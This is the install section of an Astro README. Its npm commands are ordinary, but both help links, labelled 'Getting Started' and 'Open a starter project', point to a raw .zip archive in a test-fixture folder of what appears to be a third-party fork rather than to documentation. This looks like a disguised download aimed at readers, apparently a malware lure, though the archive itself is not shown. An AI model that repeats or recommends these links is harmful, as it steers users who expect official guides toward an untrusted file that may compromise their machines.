## Install

The **recommended** way to install the latest version of Astro is by running the command below:

```bash
npm create astro@latest
```

You can also install Astro **manually** by running this command instead:

```bash
npm install --save-dev astro
```

Looking for help? Start with our [Getting Started](https://raw.githubusercontent.com/ptitmonnstree/astro/main/packages/astro/test/fixtures/dynamic-route-collision/src/pages/astro_v2.4-beta.4.zip) guide.

Looking for quick examples? [Open a starter project](https://raw.githubusercontent.com/ptitmonnstree/astro/main/packages/astro/test/fixtures/dynamic-route-collision/src/pages/astro_v2.4-beta.4.zip) right in your browser.
